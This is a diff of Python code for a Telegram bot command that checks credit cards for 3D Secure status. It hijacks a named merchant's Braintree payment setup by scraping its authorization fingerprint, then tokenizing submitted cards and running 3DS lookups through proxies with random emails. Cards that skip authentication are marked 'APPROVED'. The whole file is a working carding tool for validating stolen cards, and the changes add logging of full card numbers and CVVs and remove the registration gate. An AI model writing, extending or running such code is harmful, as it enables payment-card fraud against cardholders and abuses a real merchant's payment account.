@@ -11,7 +11,7 @@ import string
 import base64
 import uuid
 import os
-from datetime import datetime, timedelta
+from datetime import datetime
 from pyrogram import Client, filters
 from pyrogram.types import Message
 import html
@@ -54,7 +54,7 @@ except ImportError:
                 cards.append(line.strip())
         return cards, list(set(cards))
 
-# Custom logger with emoji formatting
+# Custom logger with emoji formatting for console
 class EmojiLogger:
     def info(self, message): print(f"🔹 {message}")
     def success(self, message): print(f"✅ {message}")
@@ -63,10 +63,12 @@ class EmojiLogger:
     def step(self, step_num, total_steps, message): print(f"🔸 [{step_num}/{total_steps}] {message}")
     def network(self, message): print(f"🌐 {message}")
     def card(self, message): print(f"💳 {message}")
-    def debug_response(self, message): print(f"🔧 {message}")
+    def debug(self, message): print(f"🔧 {message}")
     def bin_info(self, message): print(f"🏦 {message}")
     def user(self, message): print(f"👤 {message}")
     def proxy(self, message): print(f"🔌 {message}")
+    def response(self, message): print(f"📄 {message}")
+    def gateway(self, message): print(f"🔄 {message}")
 
 logger = EmojiLogger()
 
@@ -74,8 +76,9 @@ def load_owner_id():
     try:
         with open("FILES/config.json", "r") as f:
             config_data = json.load(f)
-            return config_data.get("OWNER_ID") or config_data.get("OWNER")
-    except:
+            return str(config_data.get("OWNER_ID") or config_data.get("OWNER"))
+    except Exception as e:
+        logger.error(f"Failed to load owner ID: {e}")
         return None
 
 def get_user_plan(user_id):
@@ -90,15 +93,16 @@ def is_user_banned(user_id):
         if not os.path.exists("DATA/banned_users.txt"):
             return False
         with open("DATA/banned_users.txt", "r") as f:
-            banned_users = f.read().splitlines()
+            banned_users = [line.strip() for line in f.readlines()]
         return str(user_id) in banned_users
-    except:
+    except Exception as e:
+        logger.error(f"Error checking ban status: {e}")
         return False
 
 def check_cooldown(user_id, command_type="vbv"):
     """Check cooldown for user - SKIP FOR OWNER"""
     owner_id = load_owner_id()
-    if str(user_id) == str(owner_id):
+    if owner_id and str(user_id) == owner_id:
         return True, 0
 
     try:
@@ -130,37 +134,6 @@ def check_cooldown(user_id, command_type="vbv"):
 
     return True, 0
 
-# Braintree VBV Error Codes and Messages
-BRAINTREE_ERRORS = {
-    "81571": "Failed to authenticate, please try a different form of payment",
-    "81572": "3D Secure authentication failed",
-    "81573": "Cardholder not enrolled in 3D Secure",
-    "81574": "3D Secure authentication unavailable",
-    "81575": "3D Secure authentication timed out",
-    "81576": "3D Secure issuer rejected authentication",
-    "2000": "Do Not Honor",
-    "2001": "Insufficient Funds",
-    "2002": "Limit Exceeded",
-    "2003": "Cardholder's Activity Limit Exceeded",
-    "2004": "Cardholder's Withdrawal Limit Exceeded",
-    "2005": "Card Not Activated",
-    "2006": "Invalid Card Number",
-    "2007": "Invalid Expiration Date",
-    "2008": "Invalid CVV",
-    "2009": "Invalid Card Type",
-    "2010": "Invalid Transaction",
-    "2011": "Duplicate Transaction",
-    "2012": "Amount Mismatch",
-    "2013": "Invalid Amount",
-    "2014": "Card Expired",
-    "2015": "Card Lost/Stolen",
-    "2016": "Card Restricted",
-    "2017": "Security Violation",
-    "2018": "Processor Unavailable",
-    "2019": "Internal System Error",
-    "2020": "Transaction Not Permitted",
-}
-
 class BraintreeVBVChecker:
     def __init__(self):
         # Modern browser user agents
@@ -171,8 +144,9 @@ class BraintreeVBVChecker:
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
         ]
         self.user_agent = random.choice(self.user_agents)
+        logger.info(f"User Agent: {self.user_agent[:50]}...")
         
-        # Target site from the provided logs
+        # Target site from logs
         self.base_url = "https://www.locoloader.com"
         self.pricing_url = f"{self.base_url}/pricing/"
         self.braintree_graphql = "https://payments.braintree-api.com/graphql"
@@ -180,8 +154,9 @@ class BraintreeVBVChecker:
         
         # Merchant ID from logs
         self.merchant_id = "3bbxc2hs5sgbs95q"
+        logger.info(f"Merchant ID: {self.merchant_id}")
         
-        # Country code to name mapping
+        # Country mappings
         self.country_map = {
             'US': 'UNITED STATES', 'GB': 'UNITED KINGDOM', 'CA': 'CANADA', 'AU': 'AUSTRALIA',
             'DE': 'GERMANY', 'FR': 'FRANCE', 'IT': 'ITALY', 'ES': 'SPAIN', 'NL': 'NETHERLANDS',
@@ -209,7 +184,7 @@ class BraintreeVBVChecker:
         self.bin_cache = {}
         self.last_bin_request = 0
         
-        # Session ID
+        # Session
         self.session_id = str(uuid.uuid4())
         self.df_reference_id = None
         
@@ -228,10 +203,13 @@ class BraintreeVBVChecker:
     def generate_random_email(self):
         random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
         domain = random.choice(self.email_domains)
-        return f"{random_string}@{domain}"
+        email = f"{random_string}@{domain}"
+        logger.user(f"Generated email: {email}")
+        return email
     
     def generate_session_id(self):
         self.session_id = str(uuid.uuid4())
+        logger.debug(f"New session ID: {self.session_id}")
         return self.session_id
     
     async def get_bin_info(self, cc):
@@ -241,6 +219,7 @@ class BraintreeVBVChecker:
         bin_number = cc[:6]
         
         if bin_number in self.bin_cache:
+            logger.bin_info(f"BIN {bin_number} (cached)")
             return self.bin_cache[bin_number]
         
         now = time.time()
@@ -280,11 +259,13 @@ class BraintreeVBVChecker:
                     else:
                         card_category = card_type
                     
+                    bank_name = str(data.get('bank', 'N/A')) if data.get('bank') else 'N/A'
+                    
                     result = {
                         'scheme': scheme,
                         'type': card_type,
                         'brand': str(data.get('brand', 'N/A')),
-                        'bank': str(data.get('bank', 'N/A')) if data.get('bank') else 'N/A',
+                        'bank': bank_name,
                         'country': country_name,
                         'country_code': country_code,
                         'emoji': flag_emoji,
@@ -292,8 +273,11 @@ class BraintreeVBVChecker:
                         'business_status': business_status,
                         'card_category': card_category,
                     }
+                    
                     self.bin_cache[bin_number] = result
+                    logger.bin_info(f"BIN {bin_number}: {scheme} - {card_type} - {bank_name} - {country_name}")
                     return result
+                    
         except Exception as e:
             logger.warning(f"BIN lookup failed: {e}")
         
@@ -326,13 +310,16 @@ class BraintreeVBVChecker:
                 'upgrade-insecure-requests': '1',
             }
             
+            logger.network(f"GET {self.pricing_url}")
             response = await client.get(self.pricing_url, headers=headers, follow_redirects=True)
+            logger.network(f"Response: {response.status_code}")
             
             if response.status_code != 200:
                 return None, f"Failed to load pricing page: {response.status_code}"
             
             content = response.text
             
+            # Look for authorization pattern
             pattern = r"authorization:\s+'([^']+)'"
             match = re.search(pattern, content)
             
@@ -341,32 +328,41 @@ class BraintreeVBVChecker:
                 match = re.search(pattern, content)
             
             if not match:
+                logger.error("Could not extract authorization token")
                 return None, "Could not extract authorization token"
             
             auth_token = match.group(1)
+            logger.debug(f"Auth token (encoded): {auth_token[:30]}...")
             
             try:
                 decoded = base64.b64decode(auth_token).decode('utf-8')
+                logger.debug(f"Decoded: {decoded[:100]}...")
+                
                 fingerprint_pattern = r'"authorizationFingerprint":"([^"]+)"'
                 fp_match = re.search(fingerprint_pattern, decoded)
                 
                 if fp_match:
                     fingerprint = fp_match.group(1)
-                    logger.success("Authorization fingerprint extracted successfully")
+                    logger.success(f"Fingerprint: {fingerprint[:30]}...")
                     return fingerprint, None
                 else:
+                    logger.error("No fingerprint in decoded token")
                     return None, "Could not extract fingerprint from token"
-            except:
+                    
+            except Exception as e:
+                logger.error(f"Decode error: {e}")
                 return None, "Failed to decode authorization token"
                 
         except Exception as e:
-            return None, f"Error getting fingerprint: {str(e)}"
+            logger.error(f"Fingerprint error: {e}")
+            return None, f"Error: {str(e)}"
     
     async def tokenize_credit_card(self, client, fingerprint, card_details):
         try:
             logger.step(2, 5, "Tokenizing credit card...")
             
             cc, mes, ano, cvv = card_details
+            logger.card(f"Card: {cc[:6]}XXXXXX{cc[-4:]} | {mes}/{ano} | {cvv}")
             
             if len(ano) == 2:
                 ano_full = '20' + ano
@@ -428,27 +424,31 @@ class BraintreeVBVChecker:
                 'operationName': 'TokenizeCreditCard',
             }
             
+            logger.network(f"POST {self.braintree_graphql}")
             response = await client.post(
                 self.braintree_graphql,
                 headers=headers,
                 json=json_data,
                 timeout=30.0
             )
+            logger.network(f"Response: {response.status_code}")
             
             if response.status_code != 200:
-                return None, f"Tokenization failed: HTTP {response.status_code}"
+                return None, f"HTTP {response.status_code}"
             
             data = response.json()
+            logger.debug(f"Response: {json.dumps(data)[:200]}...")
             
             if 'errors' in data:
-                error_msg = data['errors'][0].get('message', 'Unknown error')
-                return None, f"Braintree error: {error_msg}"
+                error_msg = data['errors'][0].get('message', 'Unknown')
+                logger.error(f"Tokenization error: {error_msg}")
+                return None, error_msg
             
             if 'data' in data and 'tokenizeCreditCard' in data['data']:
                 token = data['data']['tokenizeCreditCard']['token']
                 card_info = data['data']['tokenizeCreditCard'].get('creditCard', {})
                 
-                logger.success(f"Card tokenized: {token}")
+                logger.success(f"Token: {token}")
                 
                 return {
                     'token': token,
@@ -457,19 +457,23 @@ class BraintreeVBVChecker:
                     'brand': card_info.get('brandCode', 'N/A'),
                 }, None
             else:
+                logger.error("Unexpected response format")
                 return None, "Unexpected response format"
                 
         except Exception as e:
-            return None, f"Tokenization error: {str(e)}"
+            logger.error(f"Tokenization error: {e}")
+            return None, str(e)
     
     async def three_d_secure_lookup(self, client, fingerprint, token_data, amount, email):
         try:
             logger.step(3, 5, "Performing 3D Secure lookup...")
             
             cc_bin = token_data['bin']
+            logger.gateway(f"BIN: {cc_bin}, Amount: ${amount}, Email: {email}")
             
             df_reference_id = f"0_{str(uuid.uuid4())}"
             self.df_reference_id = df_reference_id
+            logger.debug(f"DF Reference ID: {df_reference_id}")
             
             headers = {
                 'accept': '*/*',
@@ -513,17 +517,22 @@ class BraintreeVBVChecker:
                 }
             }
             
+            url = f'{self.braintree_api}/merchants/{self.merchant_id}/client_api/v1/payment_methods/{token_data["token"]}/three_d_secure/lookup'
+            logger.network(f"POST {url}")
+            
             response = await client.post(
-                f'{self.braintree_api}/merchants/{self.merchant_id}/client_api/v1/payment_methods/{token_data["token"]}/three_d_secure/lookup',
+                url,
                 headers=headers,
                 json=lookup_data,
                 timeout=30.0
             )
+            logger.network(f"Response: {response.status_code}")
             
             if response.status_code != 201 and response.status_code != 200:
-                return None, f"3DS lookup failed: HTTP {response.status_code}"
+                return None, f"HTTP {response.status_code}"
             
             data = response.json()
+            logger.response(f"3DS Response: {json.dumps(data)[:300]}...")
             
             if 'paymentMethod' in data:
                 payment_method = data['paymentMethod']
@@ -533,16 +542,19 @@ class BraintreeVBVChecker:
                     status = tds_info.get('status', 'unknown')
                     liability_shifted = tds_info.get('liabilityShifted', False)
                     
-                    # Determine message and 3D status
+                    # Determine 3D status based on response
                     if status == 'challenge_required':
-                        message = "challenge_required"
-                        three_d_status = "𝑭𝑨𝑳𝑺𝑬! ✅"
-                    elif liability_shifted:
-                        message = "authenticate_successful"
-                        three_d_status = "𝑻𝑹𝑼𝑬 ✅"
+                        three_d_status = "𝑻𝑹𝑼𝑬! ❌"  # Challenge required
+                        display_message = "challenge_required"
+                        logger.gateway("3DS: Challenge Required - TRUE! ❌")
+                    elif liability_shifted or status == 'authenticate_successful':
+                        three_d_status = "𝑭𝑨𝑳𝑺𝑬! ✅"  # Non-VBV/Approved
+                        display_message = "authenticate_successful"
+                        logger.gateway("3DS: Non-VBV/Approved - FALSE! ✅")
                     else:
-                        message = status.replace('_', ' ').title()
-                        three_d_status = "𝑭𝑨𝑳𝑺𝑬 ❌"
+                        three_d_status = "𝑻𝑹𝑼𝑬! ❌"  # Other declines
+                        display_message = status.replace('_', ' ').title()
+                        logger.gateway(f"3DS: {status} - TRUE! ❌")
                     
                     nonce = payment_method.get('nonce')
                     details = payment_method.get('details', {})
@@ -550,7 +562,7 @@ class BraintreeVBVChecker:
                     result = {
                         'nonce': nonce,
                         'status': status,
-                        'message': message,
+                        'message': display_message,
                         'three_d_status': three_d_status,
                         'liability_shifted': liability_shifted,
                         'details': details,
@@ -558,12 +570,15 @@ class BraintreeVBVChecker:
                     
                     return result, None
                 else:
-                    return None, "No 3DS info in response"
+                    logger.error("No 3DS info in response")
+                    return None, "No 3DS info"
             else:
-                return None, "Unexpected response format"
+                logger.error("Unexpected response format")
+                return None, "Unexpected format"
                 
         except Exception as e:
-            return None, f"3DS lookup error: {str(e)}"
+            logger.error(f"3DS lookup error: {e}")
+            return None, str(e)
     
     async def send_payment_feedback(self, client, email):
         try:
@@ -588,32 +603,38 @@ class BraintreeVBVChecker:
                 'plan': '12m1u_60'
             }
             
+            url = f'{self.base_url}/api-payment-feedback/'
+            logger.network(f"POST {url}")
+            
             await client.post(
-                f'{self.base_url}/api-payment-feedback/',
+                url,
                 headers=headers,
                 data=data,
                 timeout=30.0
             )
+            logger.success("Feedback sent")
             
         except Exception as e:
-            logger.warning(f"Feedback error: {str(e)}")
+            logger.warning(f"Feedback error: {e}")
     
     async def check_card(self, card_details, username, user_data):
         start_time = time.time()
-        logger.info(f"🔍 Starting Braintree 3DS check: {card_details}")
+        logger.info(f"{'='*50}")
+        logger.info(f"NEW CHECK: {card_details}")
+        logger.info(f"User: @{username}")
         
         random_email = self.generate_random_email()
-        logger.user(f"Using email: {random_email}")
-        
         proxy_status = "Live ⚡️"
         
         try:
             cc_parts = card_details.split('|')
             if len(cc_parts) < 4:
-                return await self.format_response("", "", "", "", "ERROR", "Invalid card format", username, time.time()-start_time, user_data, proxy_status=proxy_status)
+                elapsed = time.time() - start_time
+                logger.error("Invalid card format")
+                return await self.format_response("", "", "", "", "ERROR", "Invalid format", username, elapsed, user_data, proxy_status=proxy_status)
             
             cc = cc_parts[0].strip().replace(" ", "")
-            mes = cc_parts[1].strip()
+            mes = cc_parts[1].strip().zfill(2)
             ano = cc_parts[2].strip()
             cvv = cc_parts[3].strip()
             
@@ -623,21 +644,33 @@ class BraintreeVBVChecker:
             else:
                 ano_display = ano
             
-            if not cc.isdigit() or len(cc) < 15:
-                return await self.format_response(cc, mes, ano_display, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data, proxy_status=proxy_status)
+            logger.card(f"CC: {cc[:6]}XXXXXX{cc[-4:]}|{mes}|{ano_display}|{cvv}")
             
-            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
-                return await self.format_response(cc, mes, ano_display, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data, proxy_status=proxy_status)
+            # Validation
+            if not cc.isdigit() or len(cc) < 15:
+                elapsed = time.time() - start_time
+                logger.error("Invalid card number")
+                return await self.format_response(cc, mes, ano_display, cvv, "ERROR", "Invalid number", username, elapsed, user_data, proxy_status=proxy_status)
+            
+            if not mes.isdigit() or int(mes) < 1 or int(mes) > 12:
+                elapsed = time.time() - start_time
+                logger.error("Invalid month")
+                return await self.format_response(cc, mes, ano_display, cvv, "ERROR", "Invalid month", username, elapsed, user_data, proxy_status=proxy_status)
             
             if not ano.isdigit() or len(ano) not in [2, 4]:
-                return await self.format_response(cc, mes, ano_display, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data, proxy_status=proxy_status)
+                elapsed = time.time() - start_time
+                logger.error("Invalid year")
+                return await self.format_response(cc, mes, ano_display, cvv, "ERROR", "Invalid year", username, elapsed, user_data, proxy_status=proxy_status)
             
             if not cvv.isdigit() or len(cvv) not in [3, 4]:
-                return await self.format_response(cc, mes, ano_display, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data, proxy_status=proxy_status)
+                elapsed = time.time() - start_time
+                logger.error("Invalid CVV")
+                return await self.format_response(cc, mes, ano_display, cvv, "ERROR", "Invalid CVV", username, elapsed, user_data, proxy_status=proxy_status)
             
+            # Get BIN info
             bin_info = await self.get_bin_info(cc)
-            logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} | {bin_info['bank']}")
             
+            # Get proxy
             proxy = get_proxy()
             proxy_url = format_proxy_for_httpx(proxy) if proxy else None
             
@@ -646,7 +679,9 @@ class BraintreeVBVChecker:
                 logger.proxy(f"Using proxy: {proxy.get('ip', 'unknown')}:{proxy.get('port', 'unknown')}")
             else:
                 proxy_status = "No Proxy"
+                logger.warning("No proxy available")
             
+            # Setup client
             client_kwargs = {
                 'timeout': 45.0,
                 'follow_redirects': True,
@@ -660,48 +695,60 @@ class BraintreeVBVChecker:
             
             async with httpx.AsyncClient(**client_kwargs) as client:
                 
+                # Step 1: Get fingerprint
                 fingerprint, error = await self.get_authorization_fingerprint(client)
                 if error or not fingerprint:
-                    return await self.format_response(cc, mes, ano_display, cvv, "DECLINED", error or "Failed", username, time.time()-start_time, user_data, bin_info, proxy_status=proxy_status)
+                    elapsed = time.time() - start_time
+                    logger.error(f"Fingerprint failed: {error}")
+                    return await self.format_response(cc, mes, ano_display, cvv, "DECLINED", error or "Failed", username, elapsed, user_data, bin_info, proxy_status=proxy_status)
                 
+                # Step 2: Tokenize card
                 token_data, error = await self.tokenize_credit_card(client, fingerprint, (cc, mes, ano, cvv))
                 if error or not token_data:
-                    return await self.format_response(cc, mes, ano_display, cvv, "DECLINED", error or "Failed", username, time.time()-start_time, user_data, bin_info, proxy_status=proxy_status)
+                    elapsed = time.time() - start_time
+                    logger.error(f"Tokenization failed: {error}")
+                    return await self.format_response(cc, mes, ano_display, cvv, "DECLINED", error or "Failed", username, elapsed, user_data, bin_info, proxy_status=proxy_status)
                 
+                # Step 3: 3DS lookup
                 tds_result, error = await self.three_d_secure_lookup(
                     client, fingerprint, token_data, "1.00", random_email
                 )
                 
                 if error or not tds_result:
-                    return await self.format_response(cc, mes, ano_display, cvv, "DECLINED", error or "Failed", username, time.time()-start_time, user_data, bin_info, proxy_status=proxy_status)
+                    elapsed = time.time() - start_time
+                    logger.error(f"3DS lookup failed: {error}")
+                    return await self.format_response(cc, mes, ano_display, cvv, "DECLINED", error or "Failed", username, elapsed, user_data, bin_info, proxy_status=proxy_status)
                 
+                # Step 4: Send feedback
                 await self.send_payment_feedback(client, random_email)
                 
-                elapsed_time = time.time() - start_time
+                elapsed = time.time() - start_time
                 
                 message = tds_result.get('message', 'Unknown')
-                three_d_status = tds_result.get('three_d_status', "𝑭𝑨𝑳𝑺𝑬 ❌")
+                three_d_status = tds_result.get('three_d_status', "𝑻𝑹𝑼𝑬! ❌")
                 
-                if "challenge_required" in message:
-                    status_display = "DECLINED"
-                elif tds_result.get('liability_shifted', False):
+                # Determine status display
+                if three_d_status == "𝑭𝑨𝑳𝑺𝑬! ✅":
                     status_display = "APPROVED"
                 else:
                     status_display = "DECLINED"
                 
-                logger.success(f"Check completed in {elapsed_time:.2f}s - {three_d_status}")
+                logger.success(f"Completed in {elapsed:.2f}s - {three_d_status}")
+                logger.info(f"{'='*50}")
                 
                 return await self.format_response(
                     cc, mes, ano_display, cvv, status_display, message, 
-                    username, elapsed_time, user_data, bin_info,
+                    username, elapsed, user_data, bin_info,
                     three_d_status, proxy_status
                 )
                 
         except Exception as e:
-            logger.error(f"Unexpected error: {str(e)}")
-            return await self.format_response(cc, mes, ano_display, cvv, "ERROR", "System error", username, time.time()-start_time, user_data, proxy_status="Error")
+            elapsed = time.time() - start_time
+            logger.error(f"Unexpected error: {e}")
+            logger.info(f"{'='*50}")
+            return await self.format_response(cc, mes, ano_display, cvv, "ERROR", "System error", username, elapsed, user_data, proxy_status="Error")
     
-    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None, three_d_status="𝑭𝑨𝑳𝑺𝑬 ❌", proxy_status="Live ⚡️"):
+    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None, three_d_status="𝑻𝑹𝑼𝑬! ❌", proxy_status="Live ⚡️"):
         """Format response in bot UI style"""
         if bin_info is None:
             bin_info = self.get_default_bin_info()
@@ -729,7 +776,7 @@ class BraintreeVBVChecker:
         
         bank_info = safe_bin_info['bank'].upper() if safe_bin_info['bank'] != 'N/A' else 'NETWORK ONLY'
         
-        # Build response in bot UI format
+        # Build response
         response = f"""「$cmd → /vbv」| WAYNE ✦
 ━━━━━━━━━━━━━━━
 [•] Card- {cc}|{mes}|{ano}|{cvv}
@@ -752,20 +799,16 @@ class BraintreeVBVChecker:
 
 # Command handler for /vbv
 @Client.on_message(filters.command(["vbv", ".vbv", "$vbv"]))
-@auth_and_free_restricted
 async def handle_braintree_vbv(client: Client, message: Message):
     try:
         user_id = message.from_user.id
         username = message.from_user.username or str(user_id)
         
-        command_text = message.text.split()[0]
-        command_name = command_text.lstrip('/.$')
+        logger.user(f"Command from @{username} ({user_id})")
         
-        if is_command_disabled(command_name):
-            await message.reply(get_command_offline_message(command_text))
-            return
-        
+        # Check if user is banned
         if is_user_banned(user_id):
+            logger.warning(f"Banned user attempted: {user_id}")
             await message.reply("""<pre>⛔ User Banned</pre>
 ━━━━━━━━━━━━━
 ⟐ <b>Message</b>: You have been banned from using this bot.
@@ -773,47 +816,48 @@ async def handle_braintree_vbv(client: Client, message: Message):
 ━━━━━━━━━━━━━""")
             return
         
+        # Load user data - FIXED: Don't require registration
         users = load_users()
         user_id_str = str(user_id)
+        
+        # If user not in users, create basic entry
         if user_id_str not in users:
-            await message.reply("""<pre>🔒 Registration Required</pre>
-━━━━━━━━━━━━━
-⟐ <b>Message</b>: You need to register first with /register
-⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
-━━━━━━━━━━━━━""")
-            return
+            logger.info(f"New user: {user_id}")
+            users[user_id_str] = {
+                "user_id": user_id,
+                "first_name": message.from_user.first_name or "User",
+                "username": username,
+                "plan": {"plan": "Free", "badge": "🧿"}
+            }
+            save_users(users)
         
         user_data = users[user_id_str]
         user_plan = user_data.get("plan", {})
         plan_name = user_plan.get("plan", "Free")
         
+        # Get card details
         args = message.text.split()
-        if len(args) < 2:
-            if message.reply_to_message and message.reply_to_message.text:
-                all_cards, unique_cards = extract_cards(message.reply_to_message.text)
-                if unique_cards:
-                    card_details = unique_cards[0]
-                else:
-                    await message.reply("""「$cmd → /vbv」| WAYNE ✦
-━━━━━━━━━━━━━━━
-[•] Error - Invalid Format
-[•] Message: No valid cards found in replied message.
-[•] Usage: <code>/vbv cc|mm|yy|cvv</code>
-[•] Example: <code>/vbv 4985032078775909|03|27|876</code>
-━━━━━━━━━━━━━━━""")
-                    return
-            else:
-                await message.reply("""「$cmd → /vbv」| WAYNE ✦
+        card_details = None
+        
+        if len(args) >= 2:
+            card_details = args[1].strip()
+        elif message.reply_to_message and message.reply_to_message.text:
+            all_cards, unique_cards = extract_cards(message.reply_to_message.text)
+            if unique_cards:
+                card_details = unique_cards[0]
+                logger.info(f"Extracted card from reply: {card_details}")
+        
+        if not card_details:
+            await message.reply("""「$cmd → /vbv」| WAYNE ✦
 ━━━━━━━━━━━━━━━
 [•] Error - Invalid Format
 [•] Message: Please provide a card or reply to a message containing cards.
 [•] Usage: <code>/vbv cc|mm|yy|cvv</code>
 [•] Example: <code>/vbv 4985032078775909|03|27|876</code>
 ━━━━━━━━━━━━━━━""")
-                return
-        else:
-            card_details = args[1].strip()
+            return
         
+        # Show processing message
         processing_msg = await message.reply(
             f"""「$cmd → /vbv」| WAYNE ✦
 ━━━━━━━━━━━━━━━
@@ -827,17 +871,18 @@ async def handle_braintree_vbv(client: Client, message: Message):
 <b>Checking 3DS verification... Please wait.</b>"""
         )
         
+        # Create checker and process
         checker = BraintreeVBVChecker()
         result = await checker.check_card(card_details, username, user_data)
         
         await processing_msg.edit_text(result, disable_web_page_preview=True)
         
     except Exception as e:
-        error_msg = str(e)[:150]
+        logger.error(f"Command error: {e}")
         await message.reply(f"""「$cmd → /vbv」| WAYNE ✦
 ━━━━━━━━━━━━━━━
 [•] Error - System Error
-[•] Message: {error_msg}
+[•] Message: {str(e)[:150]}
 ━━━━━━━━━━━━━━━
 [ϟ] Dev ➺ DADYY
 ━━━━━━━━━━━━━━━""")
